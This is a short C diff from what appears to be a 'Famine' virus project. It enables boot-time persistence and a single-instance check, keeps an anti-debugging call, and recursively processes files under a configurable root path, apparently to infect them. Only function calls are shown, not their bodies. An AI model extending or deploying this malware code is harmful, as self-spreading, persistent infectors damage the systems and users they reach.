@@ -59,9 +59,9 @@ void famine_main(void *input, int woody_init_ok) {
         }
         int lock_fd = lock_global();
 
-        // setup_boot_start();
-        // exit_if_process_running();
         #ifdef FAMINE_BONUS
+            setup_boot_start();
+            exit_if_process_running(lock_fd);
             char *root_path = getenv("FAMINE_ROOT_PATH");
             if (root_path) {
                 famine_process_recurcive(root_path, input, woody_init_ok);
@@ -78,8 +78,8 @@ void famine_main(void *input, int woody_init_ok) {
 }
 
 int main(int argc, char **argv) {
+    // set_log_level(L_DEBUG);
     set_log_level(L_DEBUG);
-    // set_log_level(L_NONE);
     anti_debug();
 
     (void)argc, (void)argv;
